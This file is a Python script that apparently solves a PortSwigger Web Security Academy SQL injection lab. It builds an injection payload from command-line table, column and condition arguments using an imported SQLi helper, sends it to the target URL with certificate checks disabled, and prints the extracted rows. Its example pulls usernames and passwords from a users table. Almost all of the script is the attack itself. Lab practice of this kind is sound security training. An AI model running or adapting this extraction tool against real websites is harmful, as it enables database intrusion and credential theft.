from methods import SQLi,path
from bs4 import BeautifulSoup
import sys


if __name__=="__main__":
    try:
        print(sys.argv)
        url=sys.argv[1].strip()    
        table=sys.argv[2].strip() 
        columns=[]
        condition=sys.argv[-1].strip() if sys.argv[-2].strip()=="-if" else ""
        n=len(sys.argv) - 2 if sys.argv[-2].strip()=="-if" else len(sys.argv)
        for i in range(3,n):
            columns.append(sys.argv[i].strip())
        lab10=SQLi(url,path,"--",table=table)
        url=lab10.generate_payload(columns,condition,table)
        r=lab10.session.get(url,verify=False,timeout=5)
        bs=BeautifulSoup(r.text,"html.parser")
        res=bs.find_all("tbody")
        for i in res:
            
            print(i.get_text())
        print(url)
        
    except IndexError:
        help="<table> <columns> [-if condition]"
        print(f"[?] Syntax: python3 {sys.argv[0].strip()} <url> {help}")
        print(f'[?] Example: python3 SQLi/lab9.py "https://sub.web-security-academy.net"  "users_xsnlkq" "username_fwcxmb" "password_xjmwrb"')
        exit(-1)



